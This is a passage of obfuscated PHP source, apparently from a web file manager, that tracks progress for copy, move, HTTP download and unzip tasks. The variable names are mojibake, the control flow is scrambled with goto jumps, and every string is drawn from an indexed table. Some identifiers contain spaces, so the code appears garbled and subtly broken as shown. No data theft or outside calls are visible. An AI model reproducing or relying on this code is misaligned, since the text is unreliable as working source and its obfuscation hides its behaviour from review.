Hook::bind($eçå¤Ã„ã[548], array($this, $eçå¤Ã„ã[1476])); Hook::bind($eçå¤Ã„ã[549], array($this, $eçå¤Ã„ã[1477])); Hook::bind($eçå¤Ã„ã[551], array($this, $eçå¤Ã„ã[1478])); goto fóøÓØ¨; f÷š“ƒöî: } protected function endAfter() { goto a²òÃªÑÚ®; a“ÆâóßÕÓ: Hook::unbind($fĞÔººµ´é[1483], array($this, $fĞÔººµ´é[1484])); Hook::unbind($fĞÔººµ´é[1485], array($this, $fĞÔººµ´é[1486])); Hook::unbind($fĞÔººµ´é[1487], array($this, $fĞÔººµ´é[1488])); goto B£Œ‹ìÅøñ; a¬³ˆà©ª: Hook::unbind($fĞÔººµ´é[515], array($this, $fĞÔººµ´é[1479])); Hook::unbind($fĞÔººµ´é[520], array($this, $fĞÔººµ´é[1479])); Hook::unbind($fĞÔººµ´é[522], array($this, $fĞÔººµ´é[1479])); goto a«—†’åÇ¼; A¨‚Î²¥å‡: Hook::unbind($fĞÔººµ´é[1474], array($this, $fĞÔººµ´é[1475])); Hook::unbind($fĞÔººµ´é[548], array($this, $fĞÔººµ´é[1476])); Hook::unbind($fĞÔººµ´é[549], array($this, $fĞÔººµ´é[1477])); goto EĞ›µ¸Ù›; a«—†’åÇ¼: Hook::unbind($fĞÔººµ´é[524], array($this, $fĞÔººµ´é[1479])); Hook::unbind($fĞÔººµ´é[1480], array($this, $fĞÔººµ´é[1481])); Hook::unbind($fĞÔººµ´é[541], array($this, $fĞÔººµ´é[1482])); goto a“ÆâóßÕÓ; EĞ›µ¸Ù›: Hook::unbind($fĞÔººµ´é[551], array($this, $fĞÔººµ´é[1478])); Hook::unbind($fĞÔººµ´é[552], array($this, $fĞÔººµ´é[1478])); Hook::unbind($fĞÔººµ´é[518], array($this, $fĞÔººµ´é[1479])); goto a¬³ˆà©ª; a²òÃªÑÚ®: $fĞÔººµ´é =& $_SERVER[¯Ò¬Èè]; Hook::unbind($fĞÔººµ´é[1470], array($this, $fĞÔººµ´é[1471])); Hook::unbind($fĞÔººµ´é[1472], array($this, $fĞÔººµ´é[1473])); goto A¨‚Î²¥å‡; B£Œ‹ìÅøñ: } public function copyMoveStart($dŞ×ÛŸ©Ä®, $A¼®æ¼ĞÏô, $e‡‰™Ñ¼ÁÜ, $A†¡Œã‚«—) { goto d¨à«ÔÚë; F«ª—ÃÄ´: if (substr($A¼®æ¼ĞÏô, 0, strlen($fŸ£ÌãŠñå)) == $fŸ£ÌãŠñå) { return; } if (substr($A†¡Œã‚«—, 0, strlen($fŸ£ÌãŠñå)) == $fŸ£ÌãŠñå) { return; } $dÕ› Û°­ˆ =& $this->task; goto C¼…Ü‹«¿²; C¼…Ü‹«¿²: $dÕ› Û°­ˆ[$a´Æ¦àµÄ—[1499]] = KodIO::transferType($dŞ×ÛŸ©Ä®, $e‡‰™Ñ¼ÁÜ); $this->update(); goto EÏˆã…—Î­; d¨à«ÔÚë: $a´Æ¦àµÄ— =& $_SERVER[¯Ò¬Èè]; self::log($a´Æ¦àµÄ—[1498] . $A¼®æ¼ĞÏô . $a´Æ¦àµÄ—[66] . $A†¡Œã‚«—); $fŸ£ÌãŠñå = rtrim(TEMP_FILES, $a´Æ¦àµÄ—[8]); goto F«ª—ÃÄ´; EÏˆã…—Î­: } public function updateAfter() { goto AÕ±«èÔ´; bƒĞ÷óß†: $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1447]] = $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1496]] / $FÓì®¯™ˆ¸[$eŒª¿Êšëç[712]]; if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1447]] > 0) { $D¯ŸßğŒÑ = timeFloat() - $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1449]] - $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1452]]; $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1453]] = $D¯ŸßğŒÑ * (1 - $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1447]]) / $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1447]]; } goto cÓ©‹Å÷Äß; AÕ±«èÔ´: $eŒª¿Êšëç =& $_SERVER[¯Ò¬Èè]; $FÓì®¯™ˆ¸ =& $this->task; if (!$FÓì®¯™ˆ¸[$eŒª¿Êšëç[712]]) { return; } goto f‘ùàĞÍ; f‘ùàĞÍ: if ($this->sourceModelCopyFlag) { return; } if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1499]] == $eŒª¿Êšëç[1103]) { return; } if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1499]] == $eŒª¿Êšëç[1049] || $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1499]] == $eŒª¿Êšëç[103]) { if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1493]]) { $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1496]] = $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1495]] + $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1492]]; } } else { if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1499]] == $eŒª¿Êšëç[1104]) { if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1493]] == $eŒª¿Êšëç[1049]) { $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1496]] = $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1495]] + $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1492]] * 0.5; } else { if ($FÓì®¯™ˆ¸[$eŒª¿Êšëç[1493]] == $eŒª¿Êšëç[103]) { $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1496]] = $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1495]] + $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1491]] * 0.5 + $FÓì®¯™ˆ¸[$eŒª¿Êšëç[1492]] * 0.5; } } } } goto bƒĞ÷óß†; cÓ©‹Å÷Äß: } public function addPath($C‰Îá¬Äã) { goto B©•Šå×æ; B©•Šå×æ: $CßïÓ±Ò‚  =& $_SERVER[¯Ò¬Èè]; if (!$C‰Îá¬Äã) { return; } $Cšˆ‰ÓÔ¿õ =& $this->task; goto fçòƒï¯•õ; F­åÒ·éö¿: if ($CÊíğ¶®[$CßïÓ±Ò‚ [29]] == $CßïÓ±Ò‚ [167]) { $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [985]] += 1; } else { $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [985]] += $CÊíğ¶®[$CßïÓ±Ò‚ [80]][$CßïÓ±Ò‚ [78]]; if ($CÊíğ¶®[$CßïÓ±Ò‚ [369]]) { $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [985]] += $CÊíğ¶®[$CßïÓ±Ò‚ [80]][$CßïÓ±Ò‚ [79]] + 1; } } $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [712]] += $CÊíğ¶®[$CßïÓ±Ò‚ [77]]; $this->update(); goto d å‡ÚŠ‡Å; fçòƒï¯•õ: $CÊíğ¶® = IO::infoWithChildren($C‰Îá¬Äã); $aÙ†¿¡£Ëö = $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [1500]] ? $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [1500]][$CßïÓ±Ò‚ [1501]] : 0; $Cšˆ‰ÓÔ¿õ[$CßïÓ±Ò‚ [1500]] = array($CßïÓ±Ò‚ [1501] => $aÙ†¿¡£Ëö + 1, $CßïÓ±Ò‚ [386] => $CÊíğ¶®[$CßïÓ±Ò‚ [28]], $CßïÓ±Ò‚ [75] => $CÊíğ¶®[$CßïÓ±Ò‚ [75]], $CßïÓ±Ò‚ [466] => $CÊíğ¶®[$CßïÓ±Ò‚ [466]] ? $CÊíğ¶®[$CßïÓ±Ò‚ [466]] : $CÊíğ¶®[$CßïÓ±Ò‚ [75]]); goto F­åÒ·éö¿; d å‡ÚŠ‡Å: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($b›†–ƒ»¯¿) { $c¬¼âÁ‘¿• =& $_SERVER[¯Ò¬Èè]; $eã–ê®ÂÇ =& $this->task; $eã–ê®ÂÇ[$c¬¼âÁ‘¿•[1489]] = $b›†–ƒ»¯¿[$c¬¼âÁ‘¿•[28]]; $eã–ê®ÂÇ[$c¬¼âÁ‘¿•[987]] = $b›†–ƒ»¯¿[$c¬¼âÁ‘¿•[28]]; $this->update(); } public function copyFileStart($BŞ×‰¡®²ß, $dæª’ïÁò÷, $aÌøÓƒ†„, $a‹‘ÎíÈö, $eã×‹±Ã’®, $CÈ£Ò÷‰±ğ) { goto eöø¬¾‘Õ±; eöø¬¾‘Õ±: $A—µÌàÙì =& $_SERVER[¯Ò¬Èè]; $D Œ¤µÂ©‚ = $eã×‹±Ã’®; if ($D Œ¤µÂ©‚ == $GLOBALS[$A—µÌàÙì[1502]]) { $D Œ¤µÂ©‚ = $GLOBALS[$A—µÌàÙì[1503]]; } goto bÖ ßéµŞ; c°»ƒ´Âª: $BĞ×ÅŠ…£…[$A—µÌàÙì[1489]] = $D Œ¤µÂ©‚; $BĞ×ÅŠ…£…[$A—µÌàÙì[1491]] = (int) $BŞ×‰¡®²ß->size($dæª’ïÁò÷); $BĞ×ÅŠ…£…[$A—µÌàÙì[1492]] = 0; goto bùìÕˆ™›æ; bùìÕˆ™›æ: $BĞ×ÅŠ…£…[$A—µÌàÙì[987]] = $A—µÌàÙì[33]; $BĞ×ÅŠ…£…[$A—µÌàÙì[1493]] = $A—µÌàÙì[33]; $BĞ×ÅŠ…£…[$A—µÌàÙì[1494]] = 0; goto c¿ç·›¨íà; bÖ ßéµŞ: $GLOBALS[$A—µÌàÙì[1503]] = $eã×‹±Ã’®; $GLOBALS[$A—µÌàÙì[1502]] = $CÈ£Ò÷‰±ğ; $BĞ×ÅŠ…£… =& $this->task; goto c°»ƒ´Âª; c¿ç·›¨íà: $this->update(); goto DòŸóæßå; DòŸóæßå: } public function copyFileEnd($A‡ÍËœïö, $bìË™»ˆ½·, $eŠĞÉš»¡Ô, $Cš‹ëËº£Ç, $Aï±ê™›, $bˆƒáÖ¨) { $B³ê¦ÇÚ§å =& $_SERVER[¯Ò¬Èè]; $bªƒƒóòÆ =& $this->task; $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1492]] = $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1491]]; $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1493]] = $B³ê¦ÇÚ§å[33]; if ($Aï±ê™› == $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1489]]) { $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1495]] += $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1491]]; $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1496]] = $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1495]]; $this->update(1); } else { $this->update(); $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1492]] = 0; } self::log($B³ê¦ÇÚ§å[1504] . $bìË™»ˆ½· . $B³ê¦ÇÚ§å[66] . $Cš‹ëËº£Ç . $B³ê¦ÇÚ§å[217] . $Aï±ê™› . $B³ê¦ÇÚ§å[1505] . $bªƒƒóòÆ[$B³ê¦ÇÚ§å[1489]]); } public function updateFileEnd($C»ëÇˆ»—·, $FëÌ±§Íé¾) { goto F¾ŠÆ¨ğº; dë¬º­»ÁŸ: $a‚¬Í‰øÂÖ[$bÊ‚¥‹œã[1491]] = $FëÌ±§Íé¾; $a‚¬Í‰øÂÖ[$bÊ‚¥‹œã[1495]] += $FëÌ±§Íé¾; $a‚¬Í‰øÂÖ[$bÊ‚¥‹œã[1496]] = $a‚¬Í‰øÂÖ[$bÊ‚¥‹œã[1495]]; goto d™ÈîÆƒß¦; d™ÈîÆƒß¦: $this->update(1); self::log($bÊ‚¥‹œã[1506] . $C»ëÇˆ»—·); goto Fïµ—©Ÿ—†; F¾ŠÆ¨ğº: $bÊ‚¥‹œã =& $_SERVER[¯Ò¬Èè]; $a‚¬Í‰øÂÖ =& $this->task; $a‚¬Í‰øÂÖ[$bÊ‚¥‹œã[1489]] = $C»ëÇˆ»—·; goto dë¬º­»ÁŸ; Fïµ—©Ÿ—†: } public function sourceModelCopy($Eğ‡…ŠÇˆÚ) { goto AÄ–ÅŒ©˜»; FÙŠ©µ„¡›: switch ($Bë—Ä¢ÉÖò) { case $eâÚ¥ªÆ¥¬[516]: $E‘Ã£àùëÎ = 1; break; case $eâÚ¥ªÆ¥¬[519]: $cğ±Ê»š®î[$eâÚ¥ªÆ¥¬[1489]] = $CÕè÷Š¥Ø[$eâÚ¥ªÆ¥¬[28]]; break; case $eâÚ¥ªÆ¥¬[521]: $E‘Ã£àùëÎ = intval($Eğ‡…ŠÇˆÚ[$eâÚ¥ªÆ¥¬[363]] * 0.4); break; case $eâÚ¥ªÆ¥¬[523]: $E‘Ã£àùëÎ = intval($Eğ‡…ŠÇˆÚ[$eâÚ¥ªÆ¥¬[363]] * 0.2); break; case $eâÚ¥ªÆ¥¬[525]: $E‘Ã£àùëÎ = intval($Eğ‡…ŠÇˆÚ[$eâÚ¥ªÆ¥¬[363]] * 0.4); break; } $this->update($E‘Ã£àùëÎ); $this->sourceModelCopyFlag = !1; goto cÑ£‹‹Ÿä®; CÂÕÕˆ´È–: $cğ±Ê»š®î =& $this->task; $this->sourceModelCopyFlag = !0; $E‘Ã£àùëÎ = 0; goto FÙŠ©µ„¡›; AÄ–ÅŒ©˜»: $eâÚ¥ªÆ¥¬ =& $_SERVER[¯Ò¬Èè]; $Bë—Ä¢ÉÖò = $Eğ‡…ŠÇˆÚ[0]; $CÕè÷Š¥Ø = $Eğ‡…ŠÇˆÚ[1]; goto CÂÕÕˆ´È–; cÑ£‹‹Ÿä®: } public function sourceRemove($EÖ¨ÎóœÖµ, $BãÍåßí¨­) { $fêµ£·‡§ë =& $_SERVER[¯Ò¬Èè]; $this->sourceModelCopyFlag = !0; $FÃŒîª•„† = 1; if (isset($EÖ¨ÎóœÖµ[$fêµ£·‡§ë[80]])) { $FÃŒîª•„† = $EÖ¨ÎóœÖµ[$fêµ£·‡§ë[80]][$fêµ£·‡§ë[78]] + $EÖ¨ÎóœÖµ[$fêµ£·‡§ë[80]][$fêµ£·‡§ë[79]] + 1; } $this->update($FÃŒîª•„†); $this->sourceModelCopyFlag = !1; } public function sourceMove($AµèÛŒ·•) { $this->sourceRemove($AµèÛŒ·•, !1); } public function curlProgress($fÀÎµİ¦Ğ, $F›æ•°™÷î, $e††µ¨Œ³®, $c“ÏÛÂë×í, $b‡ŸåšÀã) { $b‡µÎ„­ëÌ =& $_SERVER[¯Ò¬Èè]; $Aá¯ÙÕ´ÏÎ =& $this->task; if ($b‡ŸåšÀã > 0) { $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[987]] = $b‡µÎ„­ëÌ[1507]; $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1493]] = $b‡µÎ„­ëÌ[103]; if ($Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1491]] == $c“ÏÛÂë×í || $c“ÏÛÂë×í > 1024 * 1024) { $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1492]] = $b‡ŸåšÀã; } if ($Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1494]]) { $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1492]] = $b‡ŸåšÀã + $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1494]]; } } else { if ($e††µ¨Œ³® > 0) { if ($Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1491]] == $F›æ•°™÷î) { $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1492]] = $e††µ¨Œ³®; $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[987]] = $b‡µÎ„­ëÌ[1508]; $Aá¯ÙÕ´ÏÎ[$b‡µÎ„­ëÌ[1493]] = $b‡µÎ„­ëÌ[1049]; } } } $this->update(); } public function curlProgressStart($fêàÉèŠŠæ) { } public function curlProgressEnd($dœŠÙ¾ÑÆ—) { $E‰¶ï öêì =& $_SERVER[¯Ò¬Èè]; $bí¡°ÍÂĞ¥ =& $this->task; $d¦£Í˜Ö = curl_getinfo($dœŠÙ¾ÑÆ—); $aÁ¥³àøÜ« = $d¦£Í˜Ö[$E‰¶ï öêì[1509]]; if ($bí¡°ÍÂĞ¥[$E‰¶ï öêì[1493]] == $E‰¶ï öêì[103] && $aÁ¥³àøÜ«) { $bí¡°ÍÂĞ¥[$E‰¶ï öêì[1494]] += $aÁ¥³àøÜ«; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $BáŠáÃ¶Î =& $_SERVER[¯Ò¬Èè]; $eª¢ğ˜‚šĞ =& $this->task; $eª¢ğ˜‚šĞ[$BáŠáÃ¶Î[1510]] = 1; Hook::bind($BáŠáÃ¶Î[1483], array($this, $BáŠáÃ¶Î[1511])); Hook::bind($BáŠáÃ¶Î[1485], array($this, $BáŠáÃ¶Î[1512])); Hook::bind($BáŠáÃ¶Î[1487], array($this, $BáŠáÃ¶Î[1513])); } protected function endAfter() { $fª¢‚´á½Ú =& $_SERVER[¯Ò¬Èè]; Hook::unbind($fª¢‚´á½Ú[1483], array($this, $fª¢‚´á½Ú[1511])); Hook::unbind($fª¢‚´á½Ú[1485], array($this, $fª¢‚´á½Ú[1512])); Hook::unbind($fª¢‚´á½Ú[1487], array($this, $fª¢‚´á½Ú[1513])); } public function progressStart($e«ÀÕË¨É) { $Cö–…Óß‰¦ =& $_SERVER[¯Ò¬Èè]; $CÒ«„Ê–‡£ = curl_getinfo($e«ÀÕË¨É); self::log($Cö–…Óß‰¦[1514] . $CÒ«„Ê–‡£[$Cö–…Óß‰¦[295]]); self::valueSet($this->task[$Cö–…Óß‰¦[367]], $this->task); } public function progressEnd($cëÂÆ¦¬¬¡) { $d¤½¦»ö¿ =& $_SERVER[¯Ò¬Èè]; self::log($d¤½¦»ö¿[1515] . $this->task[$d¤½¦»ö¿[367]]); $this->end(); } public function progress($Eî¯×°²ã, $fäµ—÷æ ‘, $bòòÜš Áª, $dç•èÙ™î, $dŒ–ÏÍøİ) { $CãóŒ¦­®º =& $_SERVER[¯Ò¬Èè]; $cš‰îÁù¹ =& $this->task; if ($dŒ–ÏÍøİ > 0) { $cš‰îÁù¹[$CãóŒ¦­®º[985]] = $cš‰îÁù¹[$CãóŒ¦­®º[985]] == 0 ? $dç•èÙ™î : $cš‰îÁù¹[$CãóŒ¦­®º[985]]; $cš‰îÁù¹[$CãóŒ¦­®º[999]] = $dŒ–ÏÍøİ; } else { if ($bòòÜš Áª > 0) { $cš‰îÁù¹[$CãóŒ¦­®º[985]] = $cš‰îÁù¹[$CãóŒ¦­®º[985]] == 0 ? $fäµ—÷æ ‘ : $cš‰îÁù¹[$CãóŒ¦­®º[985]]; $cš‰îÁù¹[$CãóŒ¦­®º[999]] = $bòòÜš Áª; } } $this->update(); self::log("\160\162\x6f\147\x72\x65\163\x73\x48\164\164\x70\x3a\144\x6f\x77\x6e\72{$bòòÜš Áª}\57{$fäµ—÷æ ‘}\73\x20\165\x70\154\157\x61\x64\x3a{$dŒ–ÏÍøİ}\57{$dç•èÙ™î}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto E¶™ªÌ¡ø´; eä§±›í„¥: if (!$e‹ÁÇÇ¥†Ó[$bÏéÓíĞÏ[1352]]) { $e‹ÁÇÇ¥†Ó[$bÏéÓíĞÏ[1352]] = LNG($bÏéÓíĞÏ[1520]); } goto fÀù¯Æ†íÇ; cíÇ¼ìä«†: Hook::bind($bÏéÓíĞÏ[1044], array($this, $bÏéÓíĞÏ[1518])); $e‹ÁÇÇ¥†Ó =& $this->task; $e‹ÁÇÇ¥†Ó[$bÏéÓíĞÏ[1519]] = $bÏéÓíĞÏ[1049]; goto eä§±›í„¥; E¶™ªÌ¡ø´: $bÏéÓíĞÏ =& $_SERVER[¯Ò¬Èè]; parent::startAfter(); Hook::bind($bÏéÓíĞÏ[1516], array($this, $bÏéÓíĞÏ[1517])); goto cíÇ¼ìä«†; fÀù¯Æ†íÇ: } protected function endAfter() { $B¢µÁ§Ğ² =& $_SERVER[¯Ò¬Èè]; parent::endAfter(); Hook::unbind($B¢µÁ§Ğ²[1516], array($this, $B¢µÁ§Ğ²[1517])); Hook::unbind($B¢µÁ§Ğ²[1044], array($this, $B¢µÁ§Ğ²[1518])); } public function updateAfter() { $D­¼ä–ªš =& $_SERVER[¯Ò¬Èè]; $b„è²…¼Ö¯ =& $this->task; if (!$b„è²…¼Ö¯[$D­¼ä–ªš[985]] || !$b„è²…¼Ö¯[$D­¼ä–ªš[712]]) { return; } if ($b„è²…¼Ö¯[$D­¼ä–ªš[1519]] == $D­¼ä–ªš[1049]) { $d¯ÚÀàèÔÛ = 0; if ($b„è²…¼Ö¯[$D­¼ä–ªš[1491]]) { $d¯ÚÀàèÔÛ = $b„è²…¼Ö¯[$D­¼ä–ªš[1492]] / $b„è²…¼Ö¯[$D­¼ä–ªš[1491]]; } $b„è²…¼Ö¯[$D­¼ä–ªš[1447]] = $d¯ÚÀàèÔÛ * 0.3; } else { if ($b„è²…¼Ö¯[$D­¼ä–ªš[1519]] == $D­¼ä–ªš[301]) { $d¯ÚÀàèÔÛ = $b„è²…¼Ö¯[$D­¼ä–ªš[999]] / $b„è²…¼Ö¯[$D­¼ä–ªš[985]]; $b„è²…¼Ö¯[$D­¼ä–ªš[1447]] = 0.3 + $d¯ÚÀàèÔÛ * 0.4; } else { if ($b„è²…¼Ö¯[$D­¼ä–ªš[1519]] == $D­¼ä–ªš[103]) { $fõêóŸéÉÕ = 0; if ($b„è²…¼Ö¯[$D­¼ä–ªš[1493]] == $D­¼ä–ªš[103]) { $fõêóŸéÉÕ = $b„è²…¼Ö¯[$D­¼ä–ªš[1492]]; } $d¯ÚÀàèÔÛ = ($b„è²…¼Ö¯[$D­¼ä–ªš[1496]] + $fõêóŸéÉÕ) / $b„è²…¼Ö¯[$D­¼ä–ªš[712]]; $b„è²…¼Ö¯[$D­¼ä–ªš[1447]] = 0.3 + 0.4 + $d¯ÚÀàèÔÛ * 0.3; } } } if ($b„è²…¼Ö¯[$D­¼ä–ªš[1447]] > 0) { $AÊ™’‡±øš = timeFloat() - $b„è²…¼Ö¯[$D­¼ä–ªš[1449]] - $b„è²…¼Ö¯[$D­¼ä–ªš[1452]]; $b„è²…¼Ö¯[$D­¼ä–ªš[1453]] = $AÊ™’‡±øš * (1 - $b„è²…¼Ö¯[$D­¼ä–ªš[1447]]) / $b„è²…¼Ö¯[$D­¼ä–ªš[1447]]; } } public function addFile($D¬ª†çÔŒŒ) { goto cœİôï£÷; cœİôï£÷: $F‚Öö†ùÏ =& $_SERVER[¯Ò¬Èè]; $Dà™Š¨§¼± =& $this->task; $BÓ”ñğ¦‰ = IO::info($D¬ª†çÔŒŒ); goto BŒ‡‚ƒîšã; cÙœµâù£: $this->update(); goto DŒåÃÅê; e¸ãùéÙ´: $Dà™Š¨§¼±[$F‚Öö†ùÏ[985]] = 1; $c˜Ô³ä¶Ï« = 0; $Dà™Š¨§¼±[$F‚Öö†ùÏ[1500]] = array($F‚Öö†ùÏ[1501] => $c˜Ô³ä¶Ï« + 1, $F‚Öö†ùÏ[386] => $BÓ”ñğ¦‰[$F‚Öö†ùÏ[28]], $F‚Öö†ùÏ[75] => $BÓ”ñğ¦‰[$F‚Öö†ùÏ[75]], $F‚Öö†ùÏ[466] => $BÓ”ñğ¦‰[$F‚Öö†ùÏ[466]] ? $BÓ”ñğ¦‰[$F‚Öö†ùÏ[466]] : $BÓ”ñğ¦‰[$F‚Öö†ùÏ[75]]); goto cÙœµâù£; c»ùÉ¢: $Dà™Š¨§¼±[$F‚Öö†ùÏ[987]] = $F‚Öö†ùÏ[1508]; $Dà™Š¨§¼±[$F‚Öö†ùÏ[1493]] = $F‚Öö†ùÏ[1049]; $Dà™Š¨§¼±[$F‚Öö†ùÏ[712]] = $BÓ”ñğ¦‰[$F‚Öö†ùÏ[77]]; goto e¸ãùéÙ´; BŒ‡‚ƒîšã: $Dà™Š¨§¼±[$F‚Öö†ùÏ[1489]] = $BÓ”ñğ¦‰[$F‚Öö†ùÏ[28]]; $Dà™Š¨§¼±[$F‚Öö†ùÏ[1491]] = $BÓ”ñğ¦‰[$F‚Öö†ùÏ[77]]; $Dà™Š¨§¼±[$F‚Öö†ùÏ[1492]] = 0; goto c»ùÉ¢; DŒåÃÅê: } public function unzipAfter($b§Õ—äÚ½») { goto F–ôÊÌ©ä; FêÆ™›· : $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[999]] = 0; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1491]] = 0; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1492]] = 0; goto fÌ¦¶Ïí©ì; F–ôÊÌ©ä: $eàà¹ÎÉó™ =& $_SERVER[¯Ò¬Èè]; $E™½ÏÒ¶‡˜ =& $this->task; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1519]] = $eàà¹ÎÉó™[103]; goto eáÒÜ‡â è; f†ë¿òÀ‚é: if ($A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[29]] == $eàà¹ÎÉó™[167]) { $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[985]] = 1; } else { $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[985]] = $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[80]][$eàà¹ÎÉó™[78]]; } $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[987]] = $eàà¹ÎÉó™[33]; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1493]] = 0; goto FêÆ™›· ; fÌ¦¶Ïí©ì: $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1489]] = $eàà¹ÎÉó™[33]; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1496]] = 0; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[712]] = $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[77]]; goto F¹ê Ïªˆ×; F¹ê Ïªˆ×: $this->update(); self::log($eàà¹ÎÉó™[1521] . json_encode(array($E™½ÏÒ¶‡˜, $A×Ñ¿Á×ºÜ))); goto D¼Ëñ™éóÇ; eáÒÜ‡â è: $A×Ñ¿Á×ºÜ = IO::infoWithChildren($b§Õ—äÚ½»); $A‡Šñ…Å¶è = 0; $E™½ÏÒ¶‡˜[$eàà¹ÎÉó™[1500]] = array($eàà¹ÎÉó™[1501] => $A‡Šñ…Å¶è + 1, $eàà¹ÎÉó™[386] => $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[28]], $eàà¹ÎÉó™[75] => $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[75]], $eàà¹ÎÉó™[466] => $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[466]] ? $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[466]] : $A×Ñ¿Á×ºÜ[$eàà¹ÎÉó™[75]]); goto f†ë¿òÀ‚é; D¼Ëñ™éóÇ: } public function nameParse($déÆ¿ÑêêÚ) { goto EÄÓÛø½‹‹; EÄÓÛø½‹‹: $fñÎíĞ‡ =& $_SERVER[¯Ò¬Èè]; $EÙÈò‡©Í¾ =& $this->task; if ($EÙÈò‡©Í¾[$fñÎíĞ‡[1519]] == $fñÎíĞ‡[1049]) { $EÙÈò‡©Í¾[$fñÎíĞ‡[1519]] = $fñÎíĞ‡[301]; $EÙÈò‡©Í¾[$fñÎíĞ‡[1496]] = 0; $EÙÈò‡©Í¾[$fñÎíĞ‡[712]] = 0; } goto B‰¸¥±˜”Ÿ; B‰¸¥±˜”Ÿ: $a»äõâô£ = get_path_this($déÆ¿ÑêêÚ); if (strstr($a»äõâô£, $fñÎíĞ‡[91])) { $EÙÈò‡©Í¾[$fñÎíĞ‡[999]] += 1; $EÙÈò‡©Í¾[$fñÎíĞ‡[985]] += 1; } $EÙÈò‡©Í¾[$fñÎíĞ‡[1489]] = $déÆ¿ÑêêÚ; goto D•¾ÂˆåèÍ; D•¾ÂˆåèÍ: $this->update(); goto cÈ¨•Ë¼¼Œ; cÈ¨•Ë¼¼Œ: } } goto e÷—®ùÛÆÅ; E‹­‹î„ã: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $EšŞ¬®Å÷” =& $_SERVER[¯Ò¬Èè]; $this->objectDriver = array($EšŞ¬®Å÷”[57], $EšŞ¬®Å÷”[58], $EšŞ¬®Å÷”[59], $EšŞ¬®Å÷”[60], $EšŞ¬®Å÷”[61], $EšŞ¬®Å÷”[62], $EšŞ¬®Å÷”[63], $EšŞ¬®Å÷”[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C™ÄïĞ£í¨) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C™ÄïĞ£í¨, $_SERVER[¯Ò¬Èè][8]); } return $C™ÄïĞ£í¨; } public function getPathName($f·¡›¨¶ˆ) { return $f·¡›¨¶ˆ; } public function iconvApp($d¯ø¾Ã’) { return $d¯ø¾Ã’; } public function iconvSystem($A–®Œ‰ÉÃ) { return $A–®Œ‰ÉÃ; } public function iconvTo($BØáÇç•ƒ¹, $C‹ßˆœ…, $d±ä²ÔŠÈš) { goto fÔÇ—Š¥; f‹¿Ü¥íçÇ: $Bë±¸· Õ‰ = $C‹ßˆœ… . $bå˜êµ[66] . $d±ä²ÔŠÈš . 